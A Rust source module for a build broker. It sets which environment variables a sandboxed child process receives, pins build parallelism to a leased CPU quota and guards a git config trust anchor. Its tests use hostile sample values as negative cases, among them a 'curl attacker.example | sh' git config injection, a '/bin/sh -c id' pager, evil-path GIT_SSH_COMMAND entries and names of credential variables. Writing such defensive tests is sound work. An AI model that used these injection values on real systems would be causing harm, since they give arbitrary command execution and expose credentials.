//! The child environment contract: what the broker forwards, and what it pins.
//!
//! # Why this module exists (task 7deu, defect 2)
//!
//! The launcher execs the child with **exactly** the environment carried in the
//! [`CommandSpec`](crate::CommandSpec) — never the broker's own. That is the
//! right isolation property, but it made the broker path silently lossy in two
//! ways that both land on compilation, which is 60-90% of task wall clock:
//!
//! 1. **The pod's build environment never reached the child.** A task-run Pod
//!    renders `CARGO_TARGET_DIR` (the warm cache), `CARGO_BUILD_RUSTFLAGS` (the
//!    mold linker), `RUSTUP_HOME`, `SCCACHE_*` and friends. None of them are on
//!    the old six-key allow-list, and [`CommandSpec::validate`] *rejects* a
//!    disallowed key rather than stripping it — so a broker-launched build
//!    either failed outright or ran cold, in a different target directory,
//!    against a different linker.
//! 2. **The parallelism pins never reached the child.** `djinn-k8s`'s `job.rs`
//!    sets `CARGO_BUILD_JOBS`/`NEXTEST_TEST_THREADS` from the pod's own CPU
//!    limit *because of the load-103 thrash incident*. Routing through the
//!    broker dropped them, so cargo fell back to `available_parallelism()` —
//!    which it samples **once, at startup**, from the cgroup it is born in.
//!    Born in a 250m unleased leaf, that is `1`. Measured: `-j1` is 165s where
//!    `-j4` is 61s, a 2.7x regression on the dominant cost of every task.
//!
//! # The contract
//!
//! * The allow-list stays **closed by default**. It is not removed and it is not
//!   a deny-list: an unlisted key is still rejected by `CommandSpec::validate`.
//!   What changed is that it now names the build toolchain surface explicitly,
//!   so the set is auditable rather than accidental.
//! * The parallelism pins are **derived by the launcher and overridden**, not
//!   trusted from the caller. See [`parallelism_pins`] for why they are derived
//!   from the *leased* quota rather than the quota in force at spawn time.
//!
//! # Deliberately NOT forwarded
//!
//! `LD_PRELOAD`, `LD_AUDIT` and `LD_LIBRARY_PATH` are absent on purpose. The
//! child crosses a credential boundary (`setresuid` to `CHILD_UID`) immediately
//! before `execve`, and while `no_new_privs` and the glibc secure-execution
//! rules already neutralise them there, keeping them off the list means the
//! boundary does not *depend* on that reasoning.
//!
//! Every `GIT_CONFIG_*` variable is absent for a stronger reason:
//! `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` sets **arbitrary** git configuration,
//! and `core.sshCommand`, `core.pager`, `core.editor`, `diff.external`,
//! `filter.<x>.clean` and `credential.helper` are all arbitrary command
//! execution. A key-name allow-list is no defence at all here, because
//! `GIT_CONFIG_KEY_0` is the allowed *name* whose *value* names the dangerous
//! key. `GIT_CONFIG_NOSYSTEM` is absent too, and that is load-bearing rather
//! than tidy: measured, it makes git ignore the trust anchor below and restores
//! the exact production failure.
//!
//! # The one git variable the launcher DOES set
//!
//! The brokered child needs `safe.directory` or every `git` command in the
//! worker-owned workspace fails "dubious ownership". That arrives as
//! [`crate::git_trust`]'s launcher-written config **file**, exported as
//! `GIT_CONFIG_SYSTEM` — derived by the launcher and overridden on every spawn,
//! exactly like the parallelism pins, and admitted by [`is_allowed_environment_entry`]
//! only when its value is byte-identical to the launcher's own anchor path.

pub use crate::git_trust::GIT_TRUST_ANCHOR_KEY;

/// Exact environment keys the broker forwards to a launched child.
///
/// Grouped by why each one has to survive the broker hop. Anything not here and
/// not matched by [`ALLOWED_PREFIXES`] is refused by `CommandSpec::validate`.
const ALLOWED_KEYS: &[&str] = &[
    // ── Base shell environment ──────────────────────────────────────────────
    "HOME",
    "PATH",
    "TERM",
    "LANG",
    "TZ",
    "CI",
    "SHELL",
    "USER",
    "LOGNAME",
    "TMPDIR",
    // ── Rust toolchain ──────────────────────────────────────────────────────
    // `CARGO_*`/`RUSTUP_*` arrive via the prefix list; these are the bare names.
    "RUSTFLAGS",
    "RUSTDOCFLAGS",
    "RUSTC",
    "RUSTC_WRAPPER",
    "RUSTC_WORKSPACE_WRAPPER",
    "RUST_BACKTRACE",
    "RUST_LOG",
    // ── Go toolchain ────────────────────────────────────────────────────────
    "GOPATH",
    "GOCACHE",
    "GOMODCACHE",
    "GOFLAGS",
    "GOPRIVATE",
    "GONOSUMDB",
    "GONOSUMCHECK",
    "GOMAXPROCS",
    "GOPROXY",
    "GOSUMDB",
    "GOTOOLCHAIN",
    // ── JVM toolchain ───────────────────────────────────────────────────────
    "JAVA_HOME",
    "MAVEN_OPTS",
    "GRADLE_OPTS",
    "GRADLE_USER_HOME",
    // ── Node toolchain ──────────────────────────────────────────────────────
    "NODE_OPTIONS",
    "NODE_PATH",
    "COREPACK_HOME",
    // ── Python toolchain ────────────────────────────────────────────────────
    "PYTHONPATH",
    "PYTHONUNBUFFERED",
    "PYTHONDONTWRITEBYTECODE",
    "VIRTUAL_ENV",
    // ── C/C++ toolchain and linkers ─────────────────────────────────────────
    "CC",
    "CXX",
    "AR",
    "LD",
    "CFLAGS",
    "CXXFLAGS",
    "LDFLAGS",
    "PKG_CONFIG_PATH",
    "MOLD_JOBS",
    // ── Build-system parallelism ────────────────────────────────────────────
    "MAKEFLAGS",
    "NEXTEST_TEST_THREADS",
    "RAYON_NUM_THREADS",
];

/// Key prefixes the broker forwards wholesale.
///
/// Every entry is a toolchain namespace whose full key set is defined by an
/// external tool rather than by this repository, so enumerating exact names
/// would go stale silently. `DJINN_` is here because the worker and the launcher
/// share a rendered configuration namespace.
const ALLOWED_PREFIXES: &[&str] = &[
    "LC_",
    "DJINN_",
    "CARGO_",
    "RUSTUP_",
    "SCCACHE_",
    "NPM_CONFIG_",
    "PNPM_",
    "YARN_",
    "PIP_",
    "UV_",
    "POETRY_",
];

/// Is `key` forwardable to a launched child?
///
/// This is the single predicate behind both ends of the hop: the worker filters
/// its own environment with it before building a [`CommandSpec`](crate::CommandSpec),
/// and `CommandSpec::validate` re-checks it inside the privileged broker. The
/// worker-side filter is a convenience; the broker-side check is the control.
pub fn is_allowed_environment_key(key: &str) -> bool {
    ALLOWED_KEYS.contains(&key)
        || ALLOWED_PREFIXES
            .iter()
            .any(|prefix| key.starts_with(prefix))
}

/// Is the `key=value` **entry** forwardable to a launched child?
///
/// This — not [`is_allowed_environment_key`] — is what `CommandSpec::validate`
/// applies inside the privileged broker, because one entry cannot be judged by
/// its key alone.
///
/// [`GIT_TRUST_ANCHOR_KEY`] names a git configuration *file*. Any file. Admitting
/// it on the strength of its name would let a caller point the child's system
/// git config at something it wrote — `core.sshCommand = <anything>` — which is
/// arbitrary command execution across the boundary the broker exists to
/// establish. So it is admitted only when the value is byte-identical to
/// [`crate::git_trust::anchor_path`]: a path this process chose, in a directory
/// this process owns and no other identity can write, holding contents this
/// process wrote. A caller cannot name it usefully (the launcher overwrites the
/// value on every spawn regardless) and cannot name anything else at all.
///
/// Every other key is judged by name, as before.
pub fn is_allowed_environment_entry(key: &str, value: &str) -> bool {
    if key == GIT_TRUST_ANCHOR_KEY {
        return crate::git_trust::is_anchor_value(value);
    }
    is_allowed_environment_key(key)
}

/// Apply the launcher's git trust anchor over `environment`, replacing whatever
/// the caller supplied for [`GIT_TRUST_ANCHOR_KEY`].
///
/// Same shape and the same reasoning as [`apply_parallelism_pins`]: a caller may
/// legitimately carry the key (the pod renders git configuration), but the value
/// the child sees is always the launcher's, because only the launcher knows —
/// and owns — the file that is safe to point at.
pub fn apply_git_trust_anchor(environment: &mut Vec<(String, String)>, anchor: &std::path::Path) {
    let value = anchor.display().to_string();
    match environment
        .iter_mut()
        .find(|(existing, _)| existing == GIT_TRUST_ANCHOR_KEY)
    {
        Some(slot) => slot.1 = value,
        None => environment.push((GIT_TRUST_ANCHOR_KEY.to_owned(), value)),
    }
}

/// Parallelism pin keys the launcher **overrides** on every spawn.
///
/// A caller may legitimately send these (the pod renders them), but the value
/// the child sees is always the launcher's, because only the launcher knows the
/// quota the leaf will actually run at.
pub const PINNED_PARALLELISM_KEYS: &[&str] = &[
    "CARGO_BUILD_JOBS",
    "NEXTEST_TEST_THREADS",
    "MAKEFLAGS",
    "GOMAXPROCS",
    "RAYON_NUM_THREADS",
];

/// Job count for a cgroup whose CPU quota is `millicores`.
///
/// Floors at 1 and truncates rather than rounds: 4000m is 4 jobs, 1500m is 1.
/// This is deliberately identical to `djinn_k8s::job::cpu_limit_to_jobs`, which
/// derives the same number from the pod's CPU limit — the two must agree or a
/// build would pick a different job count depending on whether it happened to be
/// brokered.
pub fn jobs_for_millicores(millicores: u32) -> u32 {
    (millicores / 1000).max(1)
}

/// The parallelism pins a child must be born with, derived from `leased_millicores`.
///
/// # Why the LEASED quota and not the quota in force at spawn
///
/// `available_parallelism()` — and therefore cargo's default `-j`, nextest's
/// thread count, `mold --threads`, and Go's `GOMAXPROCS` — is read **once, at
/// process start**, from the cgroup the process is born in. The lease
/// deliberately changes that cgroup's quota *after* the process is running, and
/// nothing re-reads it. So there is no static value that is correct in both
/// regimes, and the choice is which regime to be wrong in:
///
/// * Pin from the **unleased** (250m) quota → every build that later gets lifted
///   runs `-j1` on a 4-core lease. Measured cost: 165s vs 61s, 2.7x, on the
///   single largest component of task wall clock. Catastrophic.
/// * Pin from the **leased** quota → a command that is *never* lifted runs with
///   more threads than its 250m quota. But a command that is never lifted is, by
///   construction, one that never consumed enough CPU to be detected as heavy —
///   it is not compute-bound, so oversubscribing its threads costs essentially
///   nothing, and the CFS quota bounds it regardless.
///
/// The asymmetry is not close, so the pin is derived from the leased quota. This
/// also restores the load-103 fix through the broker path: the child is capped at
/// the pod's own budget instead of reading the node's core count.
pub fn parallelism_pins(leased_millicores: u32) -> Vec<(String, String)> {
    let jobs = jobs_for_millicores(leased_millicores);
    let count = jobs.to_string();
    vec![
        ("CARGO_BUILD_JOBS".to_owned(), count.clone()),
        ("NEXTEST_TEST_THREADS".to_owned(), count.clone()),
        // `-j<n>` in MAKEFLAGS is honoured by a bare `make`; it cannot override
        // an explicit `make -j$(nproc)` in a project's own scripts, and this
        // does not claim to.
        ("MAKEFLAGS".to_owned(), format!("-j{count}")),
        ("GOMAXPROCS".to_owned(), count.clone()),
        ("RAYON_NUM_THREADS".to_owned(), count),
    ]
}

/// Apply the launcher-derived pins over `environment`, replacing any value the
/// caller supplied for a pinned key and appending the ones it omitted.
///
/// Order is stable: caller-supplied keys keep their positions, appended pins
/// follow in [`PINNED_PARALLELISM_KEYS`] order. Stability matters because the
/// resulting `envp` is asserted verbatim by the spawn tests.
pub fn apply_parallelism_pins(environment: &mut Vec<(String, String)>, leased_millicores: u32) {
    for (key, value) in parallelism_pins(leased_millicores) {
        match environment
            .iter_mut()
            .find(|(existing, _)| *existing == key)
        {
            Some(slot) => slot.1 = value,
            None => environment.push((key, value)),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_allow_list_is_closed_by_default() {
        for denied in [
            "LD_PRELOAD",
            "LD_AUDIT",
            "LD_LIBRARY_PATH",
            "AWS_SECRET_ACCESS_KEY",
            "ANTHROPIC_API_KEY",
            "GITHUB_TOKEN",
            "SSH_AUTH_SOCK",
            "",
            "cargo_build_jobs",
        ] {
            assert!(
                !is_allowed_environment_key(denied),
                "{denied} must not be forwardable"
            );
        }
    }

    #[test]
    fn the_build_environment_the_pod_renders_survives_the_broker_hop() {
        // Exactly the keys `djinn-k8s::job` puts on a task-run worker container
        // for the build toolchain. If any of these stops being forwardable, a
        // brokered build runs cold or against the wrong linker.
        for required in [
            "CARGO_TARGET_DIR",
            "CARGO_HOME",
            "CARGO_BUILD_JOBS",
            "CARGO_BUILD_RUSTFLAGS",
            "CARGO_INCREMENTAL",
            "RUSTUP_HOME",
            "NEXTEST_TEST_THREADS",
            "SCCACHE_DIR",
            "PATH",
            "HOME",
        ] {
            assert!(
                is_allowed_environment_key(required),
                "{required} must reach a brokered build"
            );
        }
    }

    /// `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` is an arbitrary-config injection
    /// primitive and several git keys are arbitrary command execution, so the
    /// env form must stay shut — by key AND as a whole entry, since the
    /// dangerous name travels in the *value*.
    #[test]
    fn the_git_config_injection_primitive_is_not_forwardable_in_any_form() {
        for (key, value) in [
            ("GIT_CONFIG_COUNT", "1"),
            ("GIT_CONFIG_KEY_0", "safe.directory"),
            ("GIT_CONFIG_KEY_0", "core.sshCommand"),
            ("GIT_CONFIG_VALUE_0", "curl attacker.example | sh"),
            ("GIT_CONFIG_KEY_12", "core.pager"),
            ("GIT_CONFIG_VALUE_12", "/bin/sh -c id"),
            // Would make git ignore the anchor entirely — measured, it restores
            // the exact "dubious ownership" failure.
            ("GIT_CONFIG_NOSYSTEM", "1"),
            // Would redirect the read of `$HOME/.gitconfig`, where
            // `configure_private_dep_access` stores the installation token.
            ("GIT_CONFIG_GLOBAL", "/workspace/evil"),
            ("GIT_CONFIG", "/workspace/evil"),
            ("GIT_SSH_COMMAND", "/workspace/evil"),
            ("GIT_PAGER", "/workspace/evil"),
            ("GIT_EXTERNAL_DIFF", "/workspace/evil"),
            ("GIT_ALTERNATE_OBJECT_DIRECTORIES", "/workspace/objects"),
        ] {
            assert!(
                !is_allowed_environment_key(key),
                "{key} must not be forwardable by name"
            );
            assert!(
                !is_allowed_environment_entry(key, value),
                "{key}={value} must not be forwardable as an entry"
            );
        }
    }

    /// The anchor key is admitted by VALUE, not by name: the launcher's own
    /// path and nothing else.
    #[test]
    fn the_trust_anchor_key_admits_only_the_launchers_own_file() {
        let anchor = crate::git_trust::anchor_path()
            .expect("the anchor must materialize in a test environment")
            .display()
            .to_string();
        assert!(is_allowed_environment_entry(GIT_TRUST_ANCHOR_KEY, &anchor));
        assert!(
            !is_allowed_environment_key(GIT_TRUST_ANCHOR_KEY),
            "the anchor key must never be forwardable on its name alone; that is what \
             would let a caller point the child's system config at a file it wrote"
        );
        for hostile in [
            "/workspace/wt/.evil-gitconfig",
            "/home/djinn/.gitconfig",
            "/etc/gitconfig",
            "",
            // A path that merely starts with the anchor's own.
            &format!("{anchor}-attacker"),
        ] {
            assert!(
                !is_allowed_environment_entry(GIT_TRUST_ANCHOR_KEY, hostile),
                "{hostile} must not pass as the launcher's trust anchor"
            );
        }
    }

    #[test]
    fn the_trust_anchor_overrides_a_caller_supplied_value_and_keeps_position() {
        let anchor = std::path::Path::new("/tmp/djinn-launcher-git-0/gitconfig");
        let mut environment = vec![
            ("PATH".to_owned(), "/usr/bin".to_owned()),
            (
                GIT_TRUST_ANCHOR_KEY.to_owned(),
                "/workspace/evil".to_owned(),
            ),
            ("HOME".to_owned(), "/home/djinn".to_owned()),
        ];
        apply_git_trust_anchor(&mut environment, anchor);
        assert_eq!(
            environment[1],
            (
                GIT_TRUST_ANCHOR_KEY.to_owned(),
                anchor.display().to_string()
            ),
            "a caller value must be overridden in place, never duplicated"
        );
        assert_eq!(environment.len(), 3);

        let mut absent = vec![("PATH".to_owned(), "/usr/bin".to_owned())];
        apply_git_trust_anchor(&mut absent, anchor);
        assert_eq!(absent.len(), 2);
        assert_eq!(absent[1].0, GIT_TRUST_ANCHOR_KEY);
    }

    #[test]
    fn every_pinned_key_is_itself_forwardable() {
        for key in PINNED_PARALLELISM_KEYS {
            assert!(
                is_allowed_environment_key(key),
                "the launcher pins {key}, so it must also be allowed through validation"
            );
        }
    }

    #[test]
    fn job_count_floors_at_one_and_truncates() {
        assert_eq!(jobs_for_millicores(0), 1);
        assert_eq!(jobs_for_millicores(250), 1);
        assert_eq!(jobs_for_millicores(999), 1);
        assert_eq!(jobs_for_millicores(1000), 1);
        assert_eq!(jobs_for_millicores(1500), 1);
        assert_eq!(jobs_for_millicores(4000), 4);
        assert_eq!(jobs_for_millicores(12_000), 12);
    }

    /// The pin must describe the quota the child will RUN at, not the one it is
    /// born at — that is the whole decision recorded in [`parallelism_pins`].
    #[test]
    fn pins_are_derived_from_the_leased_quota_not_the_unleased_one() {
        let unleased = parallelism_pins(250);
        let leased = parallelism_pins(4000);
        assert_eq!(unleased[0], ("CARGO_BUILD_JOBS".into(), "1".into()));
        assert_eq!(leased[0], ("CARGO_BUILD_JOBS".into(), "4".into()));
        assert_eq!(leased[2], ("MAKEFLAGS".into(), "-j4".into()));
        assert_eq!(
            leased.len(),
            PINNED_PARALLELISM_KEYS.len(),
            "every pinned key must be emitted"
        );
    }

    #[test]
    fn pins_override_a_caller_supplied_value_and_keep_position() {
        let mut environment = vec![
            ("PATH".to_owned(), "/usr/bin".to_owned()),
            // A stale pod-level value computed for a different budget.
            ("CARGO_BUILD_JOBS".to_owned(), "12".to_owned()),
            ("HOME".to_owned(), "/home/djinn".to_owned()),
        ];
        apply_parallelism_pins(&mut environment, 4000);

        assert_eq!(environment[0].0, "PATH");
        assert_eq!(
            environment[1],
            ("CARGO_BUILD_JOBS".to_owned(), "4".to_owned()),
            "a caller value must be overridden in place, never duplicated"
        );
        assert_eq!(environment[2].0, "HOME");
        let keys: Vec<&str> = environment.iter().map(|(key, _)| key.as_str()).collect();
        for pinned in PINNED_PARALLELISM_KEYS {
            assert_eq!(
                keys.iter().filter(|key| *key == pinned).count(),
                1,
                "{pinned} must appear exactly once"
            );
        }
    }
}
